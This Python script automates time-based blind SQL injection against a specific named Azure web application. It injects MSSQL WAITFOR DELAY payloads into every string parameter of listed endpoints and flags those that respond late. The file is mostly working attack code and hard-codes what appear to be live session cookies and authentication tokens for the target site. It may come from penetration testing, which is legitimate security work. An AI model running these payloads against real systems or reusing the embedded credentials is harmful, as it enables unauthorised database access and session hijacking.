import json
import requests
import time
from datetime import datetime
from typing import Dict, List, Any, Tuple
import urllib3
import argparse
import sys

# ==================== GLOBAL CONFIGURATION ====================
BASE_URL = "https://fundsq-degroof-test.azurewebsites.net"
DEFAULT_STRING_VALUE = "test_value"
DEFAULT_INT_VALUE = 0
DEFAULT_BOOL_VALUE = False
DEFAULT_FLOAT_VALUE = 0.0

# SQL Injection Payloads - Time-based blind SQL injection for MSSQL
SQL_INJECTION_PAYLOADS = [
    "';WAITFOR DELAY '0:0:10'--",
    "';WAITFOR DELAY '0:0:15'--",
    "' OR '1'='1';WAITFOR DELAY '0:0:10'--",
    "1';WAITFOR DELAY '0:0:10'--",
    "admin';WAITFOR DELAY '0:0:10'--",
]

# URL-encoded versions (for query parameters)
SQL_INJECTION_PAYLOADS_ENCODED = [
    "%27%3bWAITFOR%20DELAY%20%270%3a0%3a10%27--",
    "%27%3bWAITFOR%20DELAY%20%270%3a0%3a15%27--",
    "%27%20OR%20%271%27%3d%271%27%3bWAITFOR%20DELAY%20%270%3a0%3a10%27--",
    "1%27%3bWAITFOR%20DELAY%20%270%3a0%3a10%27--",
    "admin%27%3bWAITFOR%20DELAY%20%270%3a0%3a10%27--",
]

# Expected delay threshold (in seconds)
DELAY_THRESHOLD = 8.0  # If response takes > 8 seconds for a 10-second payload, likely vulnerable

# Headers et cookies extraits de votre requête curl
HEADERS = {
    "accept": "*/*",
    "accept-encoding": "gzip, deflate, br, zstd",
    "accept-language": "en-US,en;q=0.9,ml;q=0.8",
    "connection": "keep-alive",
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    "content-length": "4",
    "origin": "https://fundsq-degroof-test.azurewebsites.net",
    "host": "fundsq-degroof-test.azurewebsites.net",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
    "sec-ch-ua": '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"'
}

COOKIES = {
    "ext_name": "ojplmecpdpgccookcobabopnaifgidhf",
    "__RequestVerificationToken": "nJSuzb0n01OdX9lHcSekGaAeGbuQV9Zo7AZ6Qy8wrppq35A-Yc9MbzNfP3BN8USn5gg7M9WhZvxiGd6GQEA9l_C0cvJE5-hUxVfuLt2hK_Q1",
    "ARRAffinity": "b75e77002ba89b7b27787cb1e27fb03824cd4882728e9d3f98d0a753614ce3a1",
    "ARRAffinitySameSite": "b75e77002ba89b7b27787cb1e27fb03824cd4882728e9d3f98d0a753614ce3a1",
    "TranslationCulture": "ENG",
    "Sidebar": "false",
    ".AspNet.ApplicationCookie": "0jBNSuGlRVSDc-3lSE2iJxIWxRX35oiyrjJ4dlalBLi9upvrM-un7amtqTGan1zlpOBpfsKWKEqHawdCovPks4P7Ltyo6w7Xpxt4LomaEH-TWscRG2dZCLooRPaWEv2ztQEQxFkSeCv8CG9msiS8SlzkZzELdL-f6fF726Pk9_rRl8_XEhSCscOtx_iBdvdNQ-bezjdbTi6cNaODrwH-wau55zloFUSlpV4cysJVE3D-z-Ox5YRUu1c2F_-t7TkDidGMgNFR5_eaGk65eV46fh83febSgxGnXecXs77_m4ePgWa7uxUEdBAentD6Dn7s3YGRfMdvvaKrEzC1DFxkjgK7qEHeHmxqfZsB7A9ZwZcoqahXRy2fgO_1VRL2BiCQb5Q0aDiMHkb68Z3q7wpnEagSYbtMREoyxQyQ_a57uf5gKw-2j09EfIE1sQUz_zCL1b8MwBtTg8pi4gux9Es4mPJ-fIYYaKAmddGROV8QF9VfAPH-0W_F10TKSovWoed-SzcDvqtz_N8z89Q9HIGGmg",
    ".ASPXAUTH": "AF2467A4720CC0BB3CBB3EEC9E3304B6BCE9A0CE391FDD52106963BF9C89051B072AE491586B09E7BE938E072FC0F81835518B1D350BAA25166E9B9356143ABF86B6026DA0FFA72BEB4C182D1DCB85D20C3C996263179E78ED1B4E5402FC18589A5B256702A7BD00778C4C911B7B3E4378CB9DFD5F29D641B57CF13010111192ABC07421F9C53525CAF7DAC759F38E41",
    "RememberMeLoginCookie": "uname=xIeo5d2HZQiT8w/C9dnKeuUq0SHAoNfhGcfjbdRnE+ttctwr6tGf1k9ab47AmScDlWVscz0OLAFtKpgTE5T+pQ==",
    "idleTimer": "%7B%22idleTime%22%3A%220%22%2C%22updatedTime%22%3A%22Mon%20Dec%2022%202025%2012%3A51%3A20%20GMT%2B0530%20(India%20Standard%20Time)%22%7D"
}


# Input and output files
INPUT_JSON_FILE = "endpoints.json"

# ==================== UTILITY FUNCTIONS ====================

def get_default_value_for_type(param_type: str, is_simple: bool) -> Any:
    """Returns a default value based on parameter type"""
    if not is_simple:
        return None
    
    param_type_lower = param_type.lower()
    
    if any(t in param_type_lower for t in ['int', 'int32', 'int64', 'short', 'long', 'byte']):
        return DEFAULT_INT_VALUE
    
    if any(t in param_type_lower for t in ['float', 'double', 'decimal']):
        return DEFAULT_FLOAT_VALUE
    
    if 'bool' in param_type_lower:
        return DEFAULT_BOOL_VALUE
    
    return DEFAULT_STRING_VALUE


def build_request_params(parameters: List[Dict]) -> Dict[str, Any]:
    """Builds request parameters"""
    params = {}
    for param in parameters:
        param_name = param.get("Name", "")
        param_type = param.get("Type", "String")
        is_simple = param.get("IsSimpleType", True)
        
        value = get_default_value_for_type(param_type, is_simple)
        if value is not None:
            params[param_name] = value
    
    return params


def get_string_parameters(parameters: List[Dict]) -> List[str]:
    """Returns list of string-type parameters"""
    string_params = []
    for param in parameters:
        param_type = param.get("Type", "String").lower()
        is_simple = param.get("IsSimpleType", True)
        
        if is_simple and 'string' in param_type:
            string_params.append(param.get("Name", ""))
    
    return string_params


def should_skip_endpoint(parameters: List[Dict], skip_searchdata: bool = True) -> Tuple[bool, str]:
    """Check if endpoint should be skipped"""
    if not skip_searchdata:
        return False, ""
    
    excluded_param_names = ["searchData"]
    
    for param in parameters:
        param_name = param.get("Name", "")
        if param_name in excluded_param_names:
            return True, f"Parameter '{param_name}' found - endpoint skipped"
    
    return False, ""


def test_baseline_response_time(url: str, http_method: str, params: Dict[str, Any]) -> Tuple[float, bool]:
    """
    Tests baseline response time (without injection) to establish a reference
    Returns (average_time, success)
    """
    times = []
    
    for i in range(2):  # Make 2 requests to get an average
        try:
            start_time = time.time()
            
            if http_method.upper() == "GET":
                response = requests.get(url, params=params, headers=HEADERS, cookies=COOKIES, 
                                       verify=True, timeout=30)
            elif http_method.upper() == "POST":
                response = requests.post(url, data=params, headers=HEADERS, cookies=COOKIES, 
                                        verify=True, timeout=30)
            else:
                return 0.0, False
            
            end_time = time.time()
            response_time = end_time - start_time
            times.append(response_time)
            
        except Exception as e:
            print(f"    ⚠ Baseline error: {e}")
            return 0.0, False
    
    avg_time = sum(times) / len(times) if times else 0.0
    return avg_time, True


def test_sql_injection(endpoint: Dict, use_encoded: bool = False, skip_searchdata: bool = True) -> Dict[str, Any]:
    """
    Tests an endpoint for time-based SQL injection
    """
    route = endpoint.get("Route", "")
    http_verbs = endpoint.get("HttpVerbs", ["GET"])
    parameters = endpoint.get("Parameters", [])
    
    url = f"{BASE_URL}{route}"
    
    # Check if endpoint should be skipped
    should_skip, skip_reason = should_skip_endpoint(parameters, skip_searchdata)
    if should_skip:
        return {
            "endpoint": route,
            "skipped": True,
            "skip_reason": skip_reason
        }
    
    # Get string parameters only
    string_params = get_string_parameters(parameters)
    
    if not string_params:
        return {
            "endpoint": route,
            "skipped": True,
            "skip_reason": "No string parameters found"
        }
    
    http_method = http_verbs[0] if http_verbs else "GET"
    base_params = build_request_params(parameters)
    
    print(f"\n{'='*80}")
    print(f"Testing: {route}")
    print(f"Method: {http_method}")
    print(f"String parameters: {', '.join(string_params)}")
    print(f"{'='*80}")
    
    # Establish baseline response time
    print(f"  → Establishing baseline response time...")
    baseline_time, baseline_success = test_baseline_response_time(url, http_method, base_params)
    
    if not baseline_success:
        return {
            "endpoint": route,
            "skipped": True,
            "skip_reason": "Unable to establish baseline"
        }
    
    print(f"    ✓ Baseline: {baseline_time:.2f}s")
    
    # Test results
    results = {
        "endpoint": route,
        "controller": endpoint.get("Controller", ""),
        "action": endpoint.get("Action", ""),
        "http_method": http_method,
        "baseline_time": round(baseline_time, 2),
        "timestamp": datetime.now().isoformat(),
        "skipped": False,
        "vulnerabilities": []
    }
    
    # Choose appropriate payloads
    payloads = SQL_INJECTION_PAYLOADS_ENCODED if use_encoded else SQL_INJECTION_PAYLOADS
    
    # Test each string parameter with each payload
    for param_name in string_params:
        print(f"\n  → Testing parameter: {param_name}")
        
        for payload_idx, payload in enumerate(payloads, 1):
            # Extract expected delay from payload (10 or 15 seconds)
            expected_delay = 10.0
            if "'0:0:15'" in payload or "'0%3a0%3a15'" in payload:
                expected_delay = 15.0
            
            # Create a copy of parameters and inject the payload
            test_params = base_params.copy()
            test_params[param_name] = payload
            
            print(f"    [{payload_idx}/{len(payloads)}] Payload: {payload[:50]}{'...' if len(payload) > 50 else ''}")
            
            try:
                start_time = time.time()
                
                if http_method.upper() == "GET":
                    response = requests.get(url, params=test_params, headers=HEADERS, 
                                          cookies=COOKIES, verify=True, timeout=60)
                elif http_method.upper() == "POST":
                    response = requests.post(url, data=test_params, headers=HEADERS, 
                                           cookies=COOKIES, verify=True, timeout=60)
                else:
                    continue
                
                end_time = time.time()
                response_time = end_time - start_time
                
                # Check if delay is significant
                time_difference = response_time - baseline_time
                
                print(f"      Time: {response_time:.2f}s (diff: {time_difference:.2f}s, expected: ~{expected_delay}s)")
                
                # If response time exceeds threshold, potentially vulnerable
                if time_difference >= DELAY_THRESHOLD:
                    vulnerability = {
                        "parameter": param_name,
                        "payload": payload,
                        "response_time": round(response_time, 2),
                        "baseline_time": round(baseline_time, 2),
                        "time_difference": round(time_difference, 2),
                        "expected_delay": expected_delay,
                        "status_code": response.status_code,
                        "vulnerable": True
                    }
                    results["vulnerabilities"].append(vulnerability)
                    print(f"      🚨 VULNERABLE DETECTED! Confirmed delay: {time_difference:.2f}s")
                else:
                    print(f"      ✓ No vulnerability detected")
                
            except requests.exceptions.Timeout:
                print(f"      ⏱ Timeout (>60s) - Potentially vulnerable")
                vulnerability = {
                    "parameter": param_name,
                    "payload": payload,
                    "response_time": ">60",
                    "baseline_time": round(baseline_time, 2),
                    "time_difference": ">60",
                    "expected_delay": expected_delay,
                    "status_code": "Timeout",
                    "vulnerable": True
                }
                results["vulnerabilities"].append(vulnerability)
            except Exception as e:
                print(f"      ✗ Error: {str(e)[:100]}")
    
    return results


def main():
    """Main function"""
    parser = argparse.ArgumentParser(description='SQL Injection time-based testing on ASP.NET endpoints')
    parser.add_argument('--start', type=int, default=0, help='Start index')
    parser.add_argument('--end', type=int, default=None, help='End index')
    parser.add_argument('--limit', type=int, default=None, help='Maximum number of endpoints')
    parser.add_argument('--controller', type=str, default=None, help='Filter by controller')
    parser.add_argument('--use-encoded', action='store_true', 
                       help='Use URL-encoded payloads')
    parser.add_argument('--test-searchdata', action='store_true', 
                       help='Include endpoints with searchData parameter (normally skipped)')
    parser.add_argument('--input', type=str, default=INPUT_JSON_FILE, 
                       help=f'Input JSON file (default: {INPUT_JSON_FILE})')
    
    args = parser.parse_args()
    
    print(f"\n{'='*80}")
    print(f"SQL INJECTION TESTING - Time-Based Blind SQL Injection (MSSQL)")
    print(f"{'='*80}")
    print(f"Base URL: {BASE_URL}")
    print(f"Input file: {args.input}")
    print(f"Payloads: {'URL-encoded' if args.use_encoded else 'Standard'}")
    print(f"Detection threshold: {DELAY_THRESHOLD}s")
    print(f"Skip searchData: {'No' if args.test_searchdata else 'Yes'}")
    print(f"{'='*80}\n")
    
    # Load endpoints
    try:
        with open(args.input, 'r', encoding='utf-8') as f:
            endpoints = json.load(f)
        print(f"✓ {len(endpoints)} endpoints loaded\n")
    except FileNotFoundError:
        print(f"✗ Error: File '{args.input}' does not exist")
        return
    except json.JSONDecodeError as e:
        print(f"✗ Error: Invalid JSON file - {e}")
        return
    
    # Filter by controller
    if args.controller:
        endpoints = [ep for ep in endpoints if ep.get("Controller", "").lower() == args.controller.lower()]
        print(f"✓ Filtered by controller '{args.controller}': {len(endpoints)} endpoints\n")
    
    # Apply limits
    start_idx = args.start
    if args.end is not None:
        end_idx = min(args.end, len(endpoints))
    elif args.limit is not None:
        end_idx = min(start_idx + args.limit, len(endpoints))
    else:
        end_idx = len(endpoints)
    
    endpoints_to_test = endpoints[start_idx:end_idx]
    print(f"✓ Testing {len(endpoints_to_test)} endpoints (index {start_idx} to {end_idx-1})\n")
    
    output_file = f"sqli_results_{start_idx}_{end_idx}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    
    # Test each endpoint
    results = []
    vulnerable_count = 0
    
    for i, endpoint in enumerate(endpoints_to_test, start_idx + 1):
        route = endpoint.get("Route", "N/A")
        print(f"\n[{i}/{start_idx + len(endpoints_to_test)}] ", end="")
        
        result = test_sql_injection(endpoint, args.use_encoded, not args.test_searchdata)
        results.append(result)
        
        if not result.get("skipped") and result.get("vulnerabilities"):
            vulnerable_count += 1
            print(f"\n  ⚠️  VULNERABLE ENDPOINT: {len(result['vulnerabilities'])} vulnerability(ies) detected")
    
    # Save results
    try:
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        print(f"\n{'='*80}")
        print(f"✓ Results saved to '{output_file}'")
    except Exception as e:
        print(f"\n✗ Error saving results: {e}")
    
    # Final statistics
    total = len(results)
    skipped = sum(1 for r in results if r.get("skipped"))
    tested = total - skipped
    
    print(f"\n{'='*80}")
    print(f"SQL INJECTION TEST SUMMARY")
    print(f"{'='*80}")
    print(f"Total endpoints tested: {tested}")
    print(f"Endpoints skipped: {skipped}")
    print(f"VULNERABLE endpoints: {vulnerable_count}")
    print(f"Vulnerability rate: {vulnerable_count/tested*100:.1f}%" if tested > 0 else "N/A")
    print(f"{'='*80}\n")
    
    # Display found vulnerabilities
    if vulnerable_count > 0:
        print(f"\n🚨 VULNERABILITIES DETECTED:")
        print(f"{'='*80}")
        for result in results:
            if result.get("vulnerabilities"):
                print(f"\nEndpoint: {result['endpoint']}")
                for vuln in result['vulnerabilities']:
                    print(f"  → Parameter: {vuln['parameter']}")
                    print(f"    Payload: {vuln['payload'][:60]}...")
                    print(f"    Observed delay: {vuln['time_difference']}s (expected: ~{vuln['expected_delay']}s)")


if __name__ == "__main__":
    main()